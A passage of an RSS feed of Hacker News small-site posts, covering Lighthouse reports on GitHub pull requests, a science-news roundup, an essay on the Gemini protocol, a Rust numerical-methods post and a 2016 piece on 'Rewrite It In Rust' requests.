</code></pre><p>The most interesting thing about <a href="https://github.com/grouparoo/www.grouparoo.com/blob/f93ce04b26900dd7473e0ac9584d5f46a3031efb/lighthouserc.js" target="_blank" rel="nofollow noopener noreferrer">our implementation</a> is that it reads the sitemap so that it automatically tests all the URLs that we give to search engines. As a related matter, we are also <a href="https://github.com/grouparoo/www.grouparoo.com/blob/f93ce04b26900dd7473e0ac9584d5f46a3031efb/scripts/generate_static_files.ts" target="_blank" rel="nofollow noopener noreferrer">auto-generating</a> our sitemap, so this means that every time we add a page, the new page will be performance tested.</p><p>I found that setting <code>numberOfRuns</code> more than <code>1</code> just took too long. Testing a URL more than once gives more accurate results, so the tradeoff was whether to really test every page or have less accurate results. I chose to test every page and haven't seen too much variance in the results so far.</p><h2>Comment on the Pull Request</h2><p>Testing and monitoring are great, but they have to be a part of the real workflow to make any difference. I decided to start with visibility. We can update this to fail a check and prevent a merge when there is a low score later.</p><p>To add this visibility, I <a href="https://github.com/grouparoo/www.grouparoo.com/blob/f93ce04b26900dd7473e0ac9584d5f46a3031efb/.github/workflows/performance.yml#L2-L11" target="_blank" rel="nofollow noopener noreferrer">set up</a> Github to <a href="https://github.com/grouparoo/www.grouparoo.com/blob/f93ce04b26900dd7473e0ac9584d5f46a3031efb/.github/workflows/performance.yml#L12-L14" target="_blank" rel="nofollow noopener noreferrer">run an command</a> on every pull request when there is a commit.</p><p>The <a href="https://github.com/grouparoo/www.grouparoo.com/blob/f93ce04b26900dd7473e0ac9584d5f46a3031efb/scripts/performance_action" target="_blank" rel="nofollow noopener noreferrer">command</a> runs <code>lchi autorun</code> and then a script.</p><p>The <a href="https://github.com/grouparoo/www.grouparoo.com/blob/f93ce04b26900dd7473e0ac9584d5f46a3031efb/scripts/write_lighthouse_comment.ts" target="_blank" rel="nofollow noopener noreferrer">script</a> knows that <code>lhci autorun</code> puts performance reports as JSON in a certain place. It find those and generates a markdown table and writes that to disk.</p><p>Now, back in the Github action, it <a href="https://github.com/grouparoo/www.grouparoo.com/blob/f93ce04b26900dd7473e0ac9584d5f46a3031efb/.github/workflows/performance.yml#L15-L18" target="_blank" rel="nofollow noopener noreferrer">uses</a> the markdown to make a comment that gets updated each time there is a commit.</p><p>The result is a comment on each pull request like this <a href="https://github.com/grouparoo/www.grouparoo.com/pull/152#issuecomment-759074302" target="_blank" rel="nofollow noopener noreferrer">one</a>:</p><div><p><img height="485" width="990" alt="Lighthouse report as a Github comment" src="https://www.grouparoo.com/posts/lighthouse-reports-on-github/github-comment.png"></p></div><p>Each URL shows its Lighthouse overview and links to the real report. Success!</p><h3>Meta!</h3><p>Even the <a href="https://github.com/grouparoo/www.grouparoo.com/pull/154" target="_blank" rel="nofollow noopener noreferrer">pull request</a> for this blog post ran a <a href="https://github.com/grouparoo/www.grouparoo.com/runs/1715541127" target="_blank" rel="nofollow noopener noreferrer">check</a> got a report. üí•</p><div><p><img height="59" width="990" alt="Lighthouse report for this blog post!" src="https://www.grouparoo.com/posts/lighthouse-reports-on-github/meta.png"></p></div></div></div></div>]]>
            </description>
            <link>https://www.grouparoo.com/blog/lighthouse-reports-on-github</link>
            <guid isPermaLink="false">hacker-news-small-sites-25807724</guid>
            <pubDate>Sun, 17 Jan 2021 03:10:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[When parties reverse their stance, supporters immediately switch their opinions]]>
            </title>
            <description>
<![CDATA[
Score 159 | Comments 163 (<a href="https://news.ycombinator.com/item?id=25807656">thread link</a>) | @nabla9
<br/>
January 16, 2021 | https://thespeakernewsjournal.com/science/when-political-parties-reverse-their-policy-stance-their-supporters-immediately-switch-their-opinions-too/ | <a href="https://web.archive.org/web/*/https://thespeakernewsjournal.com/science/when-political-parties-reverse-their-policy-stance-their-supporters-immediately-switch-their-opinions-too/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">
				<div id="content">
			
	<div id="primary">
		<main id="main">
			
<article id="post-15093" itemtype="https://schema.org/CreativeWork" itemscope="">
	<div>
				
					
			
		<div itemprop="text">
			<p>At least a significant portion of their supporters, according to U of Aarhus researchers.</p>
<p>When two competing political parties in Denmark reversed their policy stance on an issue ‚Äî suddenly they both supported reducing unemployment benefits ‚Äî their voters immediately moved their opinions by around 15% into line with their party.</p>
<p>The same thing happened when one of these parties shifted from opposing to supporting ending Denmark‚Äôs early retirement.</p>
<p>The researchers were studying how public opinion is formed. Their recent paper sheds light on how much influence political parties have over their supporters, according to the researchers, who surveyed their panel of subjects in five successive waves between 2010 and 2011. They studied the same group of party supporters before, during and after a policy reversal.</p>
<p>‚ÄúWe can see that [the] welfare programs were actually quite popular ‚Ä¶ and many of the voters of the center-right party were in favor of these welfare programs,‚Äù commented one of the researchers, Rune Slothuus. ‚ÄúNevertheless, we can see that they reversed their opinion from supporting these welfare programs to opposing these welfare programs.‚Äù</p>
<p dir="ltr">‚ÄúI was surprised to see the parties appeared this powerful in shaping opinions,‚Äù Slothuus said. ‚ÄúOur findings suggest that partisan leaders can indeed lead citizens‚Äô opinions in the real world, even in situations where the stakes are real and the economic consequences tangible.‚Äù</p>
<p dir="ltr">The researchers pondered Western democracy in light of their findings: ‚ÄúIf citizens just blindly follow their party without thinking much about it, that should lead to some concern about the mechanisms in our democracy. Because how can partisan elites represent citizens‚Äô views if the views of citizens are shaped by the very same elites who are supposed to represent them?‚Äù</p>
<h6 dir="ltr">Source: How Political Parties Shape Public Opinion in the Real World.  and <a id="a2_Ctrl" role="button" href="https://onlinelibrary.wiley.com/action/doSearch?ContribAuthorStored=Bisgaard%2C+Martin" data-id="a2" data-db-target-for="a2" aria-controls="a2" aria-haspopup="true">Martin Bisgaard. </a><span>First published: </span><span>04 November 2020</span> <a href="https://doi.org/10.1111/ajps.12550" aria-label="Digital Object Identifier">https://doi.org/10.1111/ajps.12550</a></h6>

						


<div>
    <h3>The brain listens for things it is trying to predict</h3>
    <div><p>The brain interprets sounds as they contrast with its expectations; it recognizes patterns of sounds faster when they‚Äôre in line with what it is predicting it will hear, but it only encodes sounds when they contrast with expectations, according to <span>Technische U researchers. </span></p>
<p>The researchers showed this by monitoring the two principal nuclei of the subcortical pathway responsible for auditory processing: the inferior colliculus and the medial geniculate body, as their subjects listened to patterns of sounds which the researches modified so that sometimes they would hear an expected sound pattern, and other times something unexpected.</p>
<h6>Source: Alejandro Tabas, Glad Mihai, Stefan Kiebel, Robert Trampel, Katharina von Kriegstein. <strong>Abstract rules drive adaptation in the subcortical sensory pathway</strong>. <em>eLife</em>, 2020; 9 DOI: <a href="http://dx.doi.org/10.7554/eLife.64501" target="_blank" rel="nofollow noopener">10.7554/eLife.64501</a></h6>
</div>
</div>
						


<div>
    <h3>We have a particular way of understanding a room</h3>
    <div><p>When several research subjects were instructed to explore an empty room, and when they were instead seated in a chair and watched someone else explore the room, their brain waves followed a certain pattern, as recorded by a backpack hooked up to record their brain waves, eye movements, and paths. It didn‚Äôt matter if they were walking or watching someone else, according to UC researchers led by Dr Matthias Stangl.</p>
<p>The researchers also tested what happened when subjects searched for a hidden spot, or watched someone else do so, and found that brain waves flowed more strongly when they had a goal and hunted for something.</p>
<h6>Source: Matthias Stangl, Uros Topalovic, Cory S. Inman, Sonja Hiller, Diane Villaroman, Zahra M. Aghajan, Leonardo Christov-Moore, Nicholas R. Hasulak, Vikram R. Rao, Casey H. Halpern, Dawn Eliashiv, Itzhak Fried, Nanthia Suthana. <strong>Boundary-anchored neural mechanisms of location-encoding for self and others</strong>. <em>Nature</em>, 2020; DOI: <a href="http://dx.doi.org/10.1038/s41586-020-03073-y" target="_blank" rel="nofollow noopener">10.1038/s41586-020-03073-y</a></h6>
</div>
</div>
						


<div>
    <h3>Extroverts and introverts use different vocabularies</h3>
    <div><p>Extroverts use ‚Äòpositive emotion‚Äô and ‚Äòsocial process‚Äô words more often than introverts, according to new research conducted at <span>Nanyang Technological U</span>.</p>
<p>‚ÄòLove,‚Äô ‚Äòhappy,‚Äô and ‚Äòblessed‚Äô indicate pleasant emotions, and ‚Äòbeautiful‚Äô and ‚Äònice‚Äô indicate positivity or optimism, and are among the words found to be used more often by extroverts. So too are ‚Äòmeet,‚Äô ‚Äòshare,‚Äô and ‚Äòtalk,‚Äô which are about socializing. Extroverts use personal pronouns ‚Äî except ‚ÄòI‚Äô ‚Äî more too, another indication of sociability.</p>
<p>The correlation, however, was small, and the researchers think that stronger linguistic indicators need to be found to achieve their general goal, which is improving machine learning approaches to targeting consumer marketing.</p>
<h6>Source: Jiayu Chen, Lin Qiu, Moon-Ho Ringo Ho. <strong>A meta-analysis of linguistic markers of extraversion: Positive emotion and social process words</strong>. <em>Journal of Research in Personality</em>, 2020; 89: 104035 DOI: <a href="http://dx.doi.org/10.1016/j.jrp.2020.104035" target="_blank" rel="nofollow noopener">10.1016/j.jrp.2020.104035</a></h6>
</div>
</div>
						


<div>
    <h3>WhatsApp is changing today - Users must give the app permission to send their private data to Facebook or lose account</h3>
    <div><p>WhatsApp was bought by Facebook in 2014, but has thrived while promoting itself as a privacy-respecting messaging app that now has 1.5b monthly active users. This week, though, WhatApp sent out an update to users‚Äô phones that they must ‚Äòconsent‚Äô to a new policy or lose access.</p>
<p>Whatsapp will now share more of your data, including your IP address (your location) and phone number, your account registration information, your transaction data, and service-related data, interactions on WhatsApp, and other data collected based on your consent, with Facebook‚Äôs other companies. Facebook has been working towards more closely integrating Facebook, WhatsApp, Instagram and Messenger.</p>
<p>Users who do not agree to ‚Äòconsent‚Äô to the new policy will see their WhatsApp account become inaccessible until they do ‚Äòconsent.‚Äô These accounts will remain dormant for 120 days after which they will be ‚Äòdeleted.‚Äô</p>
<p>The biggest change to the user policy, which many people ignored and clicked ‚Äòagree‚Äô to, thinking it was just another unimportant app update message, now reads,</p>
<blockquote><p><em>‚ÄòWe collect information about your activity on our Services, like service-related, diagnostic, and performance information. This includes information about your activity (including how you use our Services, your Services settings, how you interact with others using our Services (including when you interact with a business), and the time, frequency, and duration of your activities and interactions), log files, and diagnostic, crash, website, and performance logs and reports. This also includes information about when you registered to use our Services; the features you use like our messaging, calling, Status, groups (including group name, group picture, group description), payments or business features; profile photo, ‚Äúabout‚Äù information; whether you are online, when you last used our Services (your ‚Äúlast seen‚Äù); and when you last updated your ‚Äúabout‚Äù information.‚Äô</em></p></blockquote>
<p>Notably, Elon Musk tweeted on the news, saying that WhatsApp users should switch to Signal, one of several popular privacy-focused messaging apps similar to WhatsApp.</p>
<p>The data sharing policy change doesn‚Äôt affect people in Europe due to GDPR data protection regulations.</p>
</div>
</div>
						


<div>
    <h3>President Trump silenced on top social media platforms after mob storms Capitol</h3>
    <div><p>The US president was locked out from posting new messages on his Facebook and Twitter accounts after an unruly group of supporters assembled outside the capitol building where Biden‚Äôs election win was being confirmed.</p>
<p>The lockdown on Twitter lasted 12 hours until the president removed tweets Twitter said violated its ‚Äòcivic integrity policy,‚Äô but Zuckerburg said that Trump would be silenced on Facebook and Instagram for at least two more weeks until his presidential term was over. Facebook and Twitter are two of the main ways the president communicates with citizens and the world.</p>
<p>It is the first time social media platforms have chosen to limit the free speech of such an important figure.</p>
<h6><em>Trump‚Äôs tweets from Jan 6, 2020, as recorded by thetrumparchive.com</em></h6>


<p>Many news organizations covered the story using language such as <a href="https://thespeakernewsjournal.com/wp-content/uploads/2021/01/Trump-Incites-Rioters.png" target="_blank" rel="noopener" data-slb-active="1" data-slb-asset="942503913" data-slb-internal="0" data-slb-group="15093_15041">‚ÄòTrump Incites Rioters.‚Äô</a></p>
<p>Following Trumps ‚Äòban,‚Äô there was renewed talk about treating social media platforms, where people share informative content, as publishers themselves, in part because their algorithms amplify things shared when those things are engaging. There was also talk about how the social media platforms that censored the president‚Äôs content did so as a response to content or events but without first drawing their ‚Äòred line‚Äô and saying which content is and isn‚Äôt allowed on their platforms.</p>
<p>Some of Trump‚Äôs staff resigned following the incident at the Capitol building, and there were also a lot of questions why the national guard wasn‚Äôt capable of handling the incident properly.</p>
<p>UPDATE January 8: Twitter permanently banned Trump‚Äôs account. Google removed Parler, an app like Twitter used by Trump supporters, from the Android app store to make it harder for people to download it, saying Google requires social media apps to have content moderation policies to remove posts that incite violence.</p>
</div>
</div>		</div>

				
			</div>
</article>

			

					</main>
	</div>

	

	</div>
</div></div>]]>
            </description>
            <link>https://thespeakernewsjournal.com/science/when-political-parties-reverse-their-policy-stance-their-supporters-immediately-switch-their-opinions-too/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25807656</guid>
            <pubDate>Sun, 17 Jan 2021 02:56:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Tragedy of Gemini]]>
            </title>
            <description>
<![CDATA[
Score 46 | Comments 20 (<a href="https://news.ycombinator.com/item?id=25807633">thread link</a>) | @panic
<br/>
January 16, 2021 | https://maya.land/monologues/2021/01/11/the-tragedy-of-gemini.html | <a href="https://web.archive.org/web/*/https://maya.land/monologues/2021/01/11/the-tragedy-of-gemini.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article itemscope="" itemtype="http://schema.org/BlogPosting">
  

  <div itemprop="articleBody">
    <p><strong>the below does not explain what Gemini is, but <a href="https://gemini.circumlunar.space/">this does</a></strong></p>

<p>Reading people‚Äôs gemlogs, I get a sense of a smaller internet. I stumble across an article about Pacific Northwest seaweed, a list of types. Someone else writes her thoughts: ‚ÄúReally, prepare to question groupthink‚Äù. A history of adoptable cyberpets. It is addicting to read people‚Äôs neat summaries of interests, ascii art embellishments.</p>

<p>But something about it makes me sad.</p>

<p>There‚Äôs something called the Eternal September, about how ‚Äì well, should I be pretending to tell you from the position of someone who‚Äôd know? It happened the month after I was born.</p>

<p>Every September before, college students with new network access would stream onto Usenet fora without ever having accustomed themselves to the etiquette. Things would get rowdy and stupid for a while. Then they would learn or get bored and things would quiet down again.</p>

<p>That September, though, was more than just college students ‚Äì America Online offered Usenet access to all its members. Ever after, the numbers would be dominated by those who had no manners, who didn‚Äôt know there was culture to learn. September continued forever.</p>

<p>The design of Gemini isn‚Äôt the community. I‚Äôm sure there are a few people who use the bridged NPR website available served via Gemini who are really in it because they‚Äôre Just That Mad About JavaScript, but those aren‚Äôt the people who make the place. It‚Äôs a bunch of people who learned a new markup language and installed some new fiddly tools and wrote their journals in plain text and taught me what seaweed is edible‚Ä¶ why?</p>

<p>Something about Gemini strikes me as a grail quest for the Eternal August, before webscale crushed the things we love.</p>

<p>While everything I have seen served via Gemini is friendly and sociable, the technical barriers of what-is-a-command-line and how-do-I-use-one are a fence put up that keep out the riffraff. Certainly, you can walk around the corner and go through the gate, but ultimately the geminiverse is lovely because it is underpopulated, slower-paced, and literate. It is difficult enough to access that those who can use it can be welcoming without worrying its smallness will be compromised.</p>

<p>The tragedy is that I don‚Äôt think many of its denizens would claim that they <em>only</em> want to hear from technical, educated people, but in order to use a <em>small</em> internet, an August internet, they have let the fence keep out anyone else.</p>

<p>This is the part of the piece where I pivot to My Proposal to Fix Everything, right? Where I tell you about my new community or my idea for what people should be doing or if we only started using tags <em>right</em>‚Ä¶</p>

<p>I don‚Äôt know that I think that it‚Äôs that neat.</p>

<p>I will probably keep reading things on Gemini, keep querying its search engine for terms and being delighted by neatly crafted plain-text.</p>

<p>But I will probably keep finding it sad.</p>

  </div>
</article></div>]]>
            </description>
            <link>https://maya.land/monologues/2021/01/11/the-tragedy-of-gemini.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25807633</guid>
            <pubDate>Sun, 17 Jan 2021 02:52:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Scientific Computing in Rust]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25807341">thread link</a>) | @mort96
<br/>
January 16, 2021 | https://aftix.xyz/home/bacon/ | <a href="https://web.archive.org/web/*/https://aftix.xyz/home/bacon/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>While getting my degree in Physics, I had to take classes in both MatLab and Python
for scientific computing. I preferred python, where we used the SciPy and NumPy
packages. In fact, I used those packages again (along with matplotlib) in an
undergraduate research project simulating bacteria films. There's a catch: I was
also pursuing a degree in Computer Science, and Python just wasn't fast enough
for that side of me, so, during my free time in graduate school, I rewrote my biofilm
simulation in my new favorite language, Rust.</p>
<p>First problem: I needed to replace
<code>jsonpickle</code> for data serialization. This problem was easy, as the <code>serde</code> crate
is an amazing replacement (I even transitioned from JSON to Rusty Object Notation, RON).
Second problem: Should I try to get matplotlib bindings in Rust or should I use
a more Rust-y plotting library? I decided on the latter, finding <code>plotters</code> to be
a suitable replacement for matplotlib. Last problem: How do I replace the differential
equation solvers of SciPy? I ended up writing a custom predictor-corrector solver
which worked well enough, giving identical simulation results while being five
hundred times faster than my python code at just the simulation step, rendering
not included (plotting directly to an RGB buffer then using libx264 bindings to
generate raw H.264 frames that mpv can understand also gave a similar speedup to
the rendering step over writing out every frame as a png file in matplotlib and
using a shell script to ffmpeg the outputs together). Full disclosure, a large part
of this speedup probably comes from my <em>derivative</em> function being not-python, rather
than my implementation of a differential equation solver over SciPy's. Furthermore,
I only breached the five hundred barrier when switching to using a QuadTree to
find the nearest neighbors of a bacteria, before that the speed up was more in
the three hundreds. This port of my old project can be found <a href="https://github.com/aftix/rustfilm">here</a>
if you care for some reason.</p>
<h2>Introducing bacon-sci</h2>
<p>Inspired, I decided to start on a full SciPy replacement in rust as I could not find
one I liked on crates.io (I later found the <code>peroxide</code> crate). I even had a clever name:
<a href="https://github.com/aftix/bacon">bacon</a>, named after Francis Bacon and the pork based food; however, <code>bacon</code> is already
a crate, so I went for the next best thing: <a href="https://crates.io/crates/bacon-sci">bacon-sci</a>.</p>
<p>I started out with the easiest part. SciPy has a set of scientific constants from
the NIST. I just took the list of important constants from SciPy and put it in a module.
In addition, I took NIST's CODATA and put it into a global map that corresponds a
String of the constant's name to a triplet: an f64 of its value, an f64 of its uncertainty,
and a String of its units. How do you make a static map? I just used the <code>lazy_static</code>
crate.</p>
<p>Next, I returned to the area that inspired me: initial value problems. After that,
I tackled root finding and polynomials. Lastly, as of now, I implemented a few special
polynomials and numeric differentiation. Armed with a copy of Burden and Faires's
"Numerical Analysis (8th ed.)", Wikipedia, and SciPy source code, I went to work.</p>
<p>The first decision I made was to use a linear algebra crate, specifically <code>nalgebra</code>.
I have written many vector and matrix implementations in the past, and I didn't feel
like doing it this time. Besides, <code>nalgebra</code> is probably faster than anything I
can write.</p>
<p>The next decision was using the <code>alga</code> crate to handle generics
of complex types and real types. I wanted all algorithms that could work on
complex numbers to be able to, so most of the functions in <code>bacon-sci</code> work on
<code>N: ComplexField</code>. If an algorithm requires a parameter to be well-ordered (like time),
then it is a <code>N: RealField</code>. In cases where a function takes both, the generic parameter
is a <code>N: ComplexField</code> with the real parameters being <code>N::RealField</code>, which is the real
"backing type" of the possibly complex field. Some functions require complex arithmetic,
so they automatically upgrade from <code>N: ComplexField</code> to <code>Complex&lt;N::RealField&gt;</code> from
<code>num_complex</code>.</p>
<p>Interestingly, there are cases where I wanted to automatically
downgrade from definitely complex back to "maybe complex", which was more difficult
than the other way. To upgrade, all I needed was <code>Complex::&lt;N::RealField&gt;::new(z.real(), z.imaginary())</code>,
where <code>z</code> is a possibly complex value,
with real types giving zero on the imaginary component. To go the other way, I decided
to basically take the real component and ignore the imaginary component. To do this from
a <code>N: ComplexField</code> I had to check if <code>N::RealField == N</code> to see if <code>N</code> was real
or complex. To do this, I used <code>TypeId::of::&lt;N::RealField&gt;() == TypeId::of::&lt;N&gt;()</code>.
If <code>N</code> was real, converting from complex was easy: use <code>ComplexField::from_real</code> on
the real component, ignoring the imaginary. On the other hand, if <code>N</code> was complex,
the conversion needed to preserve the imaginary component. <code>ComplexField</code> has no
<code>from_imaginary</code>, so I directly implemented \( a + bi \) with
<code>ComplexField::from_real(z.re) + (-ComplexField::one()).sqrt() * ComplexField::from_real(z.im)</code>,
with <code>z</code> being the definitely complex value.</p>
<h2>Euler Method</h2>
<p>A differential equation is an equation describing a thing in terms of how
that thing changes. For those unfamiliar, <a href="https://www.youtube.com/watch?v=p_di4Zn4wz4">this</a>
is a good introduction. In order to solve a differential equation, you need some conditions.
These come in two flavors: boundary conditions and initial values, with both names
being self-describing. My second task on <code>bacon-sci</code> was to implement algorithms
that solve initial value differential equations, referred to as initial value
problems or <code>ivp</code> in the code.</p>
<p>Abstractly, the system of differential equations can be written, with an arrow
representing a vector quantity, as
\[ \frac{\mathrm{d}\vec{y}}{\mathrm{d}t} = f(t, \vec{y}) . \]
This is a first-order system of differential equations since
only the first derivative is present. Generally, many higher-order
equations can be reduced to first-order by thinking of each derivative
as a new variable. The initial condition is then represented as
\[ \vec{y}(t_0) = \vec{y}_0 \]</p>
<p>These equations immediatly lead to the first algorithm
for solving initial value problems, Euler's method. Consider
this question: given a timestep \( \Delta t \), what is the
corresponding \( \Delta \vec{y} \)? We can approximate
\( \Delta \vec{y} / \Delta t \approx \mathrm{d}\vec{y}/\mathrm{d}t = f(t, \vec{y}) \),
(that is, use the tangent line to estimate the function),
leading to \( \Delta \vec{y} = f(t, \vec{y} )\Delta t \). This gives us an iterative
algorithm, \( \vec{y}_{i + 1} = \vec{y}_{i} + f(t, \vec{y})\Delta t \). This
is Euler's method. From the starting conditions, pick a timestep and iterate until
you reach the end.</p>
<p>So how good is Euler's method? Not very good. As an example, imagine solving
a mechanics differential equation with positions and velocities. Conservation
of energy says that energy should be conserved. Will Euler's method conserve
energy? In general, it will not. Energy in Euler's method tends to explode.
One solution to this is to use a slightly different version of the algorithm
known as Euler-Cromer or the semi-implicit Euler's method. In this method,
velocities are updated first, then positions are updated using the new velocities
(in Euler's method, you'd use the old velocities). Euler-Cromer is much better,
tending to conserve energy, especially in spring systems. According to Gaffer on Games,
game physics tend to use the Euler-Cromer as it only requires calculating the derivative
once but gives much better results than Euler's.</p>
<h2>Runge-Kutta Methods</h2>
<p>One problem with Euler's method is that the error in each step is linear in the
step size. We can do better. To start with, remember Taylor series from
basic calculus. That is, remember you can approximate a function of one
variable like
\[
f(x) = f(x_0) + f'(x_0) (x - x_0) + \frac{f''(x_0)}{2} {(x - x_0)}^2 + \ldots .
\]
Similarly, we can approximate our derivative function from the last section with
\[
f(t, \vec{y}) = f(t_0, \vec{y}_0)
+ \left((t - t_0)\frac{\partial f}{\partial t}(t_0, \vec{y}_0)
+(\vec{y} - \vec{y}_0)\frac{\partial f}{\partial \vec{y}}(t_0, \vec{y}_0)\right)
+ \ldots ,
\]
where the powers of our vectors are done element-wise. Additionally, Taylor's Theorem
bounds the error via some small parameters \(\xi, \mu\).
In this light, we can say Euler's method is a zeroth order approximation, which is
why the error is linear. You can use Taylor polynomials for better IVP solvers, but
this requries information about the derivatives of \(f\). Instead, Runge-Kutta
methods allow for tighter error bounds without using the derivative.</p>
<p>To see an example of this, I will derivethe midpoint method here. Imagine for a
moment that instead of taking a full timestep, you take a partial timestep and use
\(f\) at that point to approximate the second Taylor polynomial. That is, choose
a \(a_1, \alpha_1, \beta_1\) so that \(a_1 f(t + \alpha_1, \vec{y} + \beta_1)\)
approximates
\[
T^{(2)}(t, \vec{y}) = f(t, \vec{y}) + \frac{h}{2}f'(t, \vec{y}),
\]
where \(h\) is the timestep, with quadratic error in the timestep.
Note that \(f'(t, y) = \partial f/\partial t(t, \vec{y})
+ \partial f/\partial \vec{y}(t, \vec{y}) \vec{y}'(t) \).
Thus,
\[
T^{(2)} = f(t, \vec{y}) + \frac{h}{2}\frac{\partial f}{\partial t}f(t, \vec{y})
+ \frac{h}{2}\frac{\partial f}{\partial \vec{y}}(t, \vec{y}) f(t, \vec{y}) .
\]
Expanding \(a_1 f(t + \alpha_1, \vec{y} + \beta_1)\) via Taylor series gives
\[
a_1 f(t, \vec{y}) + a_1 \alpha_1 \frac{\partial f}{\partial t}(t, \vec{y})
+ a_1\beta_1 \frac{\partial f}{\partial y}(t, y) .
\]
Thus, \(a_1 = 1\), \(a_1 \alpha_1 = h/2\), and \(a_1 \beta_1 =
f(t, \vec{y}) h / 2\). This uniquely determines the coefficients, giving rise to
the midpoint method:
\[
\vec{y}_{i + 1} = \vec{y}_i + hf\left(t_i + \frac{h}{2}, \vec{y}_i + \frac{h}{2}f\left(t_i, \vec{y}_i\right)\right) .
\]</p>
<p>This process can be repeated for higher order polynomials. The classic
Runge-Kutta method is order 4, and is used as follows:
\[
\vec{k}_1 = hf(t_i, \vec{y}_i),
\]</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://aftix.xyz/home/bacon/">https://aftix.xyz/home/bacon/</a></em></p>]]>
            </description>
            <link>https://aftix.xyz/home/bacon/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25807341</guid>
            <pubDate>Sun, 17 Jan 2021 01:56:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Have you considered Rewriting It In Rust? (2016)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25807127">thread link</a>) | @CyberRabbi
<br/>
January 16, 2021 | http://transitiontech.ca/random/RIIR | <a href="https://web.archive.org/web/*/http://transitiontech.ca/random/RIIR">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="layout">
    <div id="main">
        
        
        <div id="content" data-role="content"> 
<p>My first proper programming language was C.
It was super confusing, and I wrote some terrible code that didn't really do anything terribly useful.</p>
<p>Along the way, however, I learned a bit about how computers do things, sort of.
I say sort of because <a href="http://programmers.stackexchange.com/questions/267583/why-is-c-still-in-the-category-of-high-level-language" title="If you disagree, please voice your dissent in my comment section">C is a <em>high level language</em></a>.</p>
<p>Of course, there are <em>higher-level</em> languages, and those end up being really good for a very wide array of tasks, so I went and learned them, and then I started actually getting things done.
I'm glad I started with C, though, since it gave me an idea of what these other languages must be doing under the hood to accomplish so much with so little code.</p>
<p>Using Scheme, Python, or Javascript, I didn't have to bother with managing the computer's memory allocation manually, and that turned out to be a lot more fun.</p>
<p>At some point a while back, I heard about <a href="https://www.rust-lang.org/">Rust-lang</a>.</p>
<p>What is Rust?</p>
<blockquote>
<p>Rust is a systems programming language that runs blazingly fast, prevents segfaults, and guarantees thread safety. </p>
</blockquote>
<h2 id="sounds-good-right">Sounds good, right?</h2>
<p>Yea, actually.</p>
<p>I think it's a pretty awesome language.
The problem is, I make my living writing stuff working on web apps, and that means writing Javascript.
That's not a problem, necessarily, but I just don't have much use for a language like Rust.</p>
<p>It definitely seems awesome, and as a lisp aficionado, I love a lot of its high level concepts.
As I recall, Rust even has properly nesting block comments, which I find quite practical.</p>
<h2 id="where-am-i-going-with-this">Where am I going with this?</h2>
<p>Well, I just wanted to clear up that I don't think Rust is a bad language.
I'm not going to criticize <em>Rust</em> in this article, however, I am going to criticize a part of the community surrounding the language.</p>
<p>To be honest, actually, I'm not really sure the people I'm going to criticize are even a part of the community.
At best, they seem to be a part of the fringe.</p>
<p>Who are these people?</p>
<p>They are the people who show up unannounced on your software project's doorstep (probably your issue tracker) and ask the following question:</p>
<blockquote>
<p>Have you considered <em><strong>Rewriting It In Rust</strong></em>?</p>
</blockquote>
<h2 id="yes-im-starting-a-language-flame-war">Yes, I'm starting a language flame war</h2>
<p>Ok, here we go.</p>
<p>If you've spent any time at all in a community where programmers hang out, you've probably seen a flame war over which language is best.</p>
<p>I don't know which language is best, though I've argued for Scheme many times because nobody else seems to be doing it.</p>
<p>That being said, I've noticed that this particular subset of the Rust community seems to do this particular thing often enough that it's nearly the only thing that I know about the Rust community.</p>
<p>I've joked about it with friends and coworkers, and sure enough, most of them have witnessed it in the wild.</p>
<p>I believe the first time I saw it was on the (now disabled) <a href="https://github.com/cjdelisle/cjdns">cjdns</a> issue tracker.</p>
<p>I was lucky enough to have the tracker turned on for long enough that I was able to get a screenshot:</p>
<p><img src="http://transitiontech.ca/assets/riir/cjdns-eventually-moving-to-rust.jpg" alt="" title="'prevent thread problems' in software that runs on one thread... yea"></p>
<p>It all started and ended pretty quickly.
Some <em>Rustafarian</em> asked a question, and the author (<a href="https://github.com/cjdelisle">@cjdelisle</a>) answered somewhat sarcastically.</p>
<p>Once OP figures out that their brilliant idea is not being taken seriously, they get annoyed and leave.</p>
<h2 id="but-wait-theres-more">But wait, there's more</h2>
<p>Yea, of course it goes on.
I heard it a few more times, laughed about it (oh, this again), and then continued on with my life.</p>
<p>Of course, clearly it happened enough times that I started to notice a trend, because as I mentioned, I've joked about it with people, and they've noticed it too.</p>
<p>So, this morning (<strong>2016-03-22</strong>) I saw <a href="https://github.com/fc00/go-fc00/issues/1">a thread</a> in a repo I'm watching, and there it was again:</p>
<p><img src="http://transitiontech.ca/assets/riir/go-fc00-why-go.jpg" alt="" title="...my actual question was about building a maybe more valuable solution..."></p>
<p>Once again, my friends make some snappy comments.
Pair those with a classic <em>if you want it written why don't you write it</em>, a few more <em>lulz</em> and our <em>Rustacean</em> acquaintance gets annoyed:</p>
<blockquote>
<p>ok, didn't thought a simple question would attract that much angry trolls.</p>
</blockquote>
<p>..and things pretty much die out.</p>
<h2 id="but-then-i-started-thinking">But then I started thinking</h2>
<p>We joked about it on IRC, and a few more people comment that they've also seen this in the wild, and quickly enough we find that we need an acronym because <em>Rewrite It In Rust</em> takes too long to type and so <strong>RIIR</strong> is born.</p>
<p>So, naturally, once an acronym is born, we have a meme, and memes like to spread.
So, naturally, I start digging:</p>
<blockquote>
<p>Who else has been hit by this storm that has been sweeping the web?</p>
</blockquote>
<h3 id="nix">Nix</h3>
<p>Apparently there were a few threads like <a href="http://lists.science.uu.nl/pipermail/nix-dev/2015-December/019040.html">this one</a> which went on for a while.
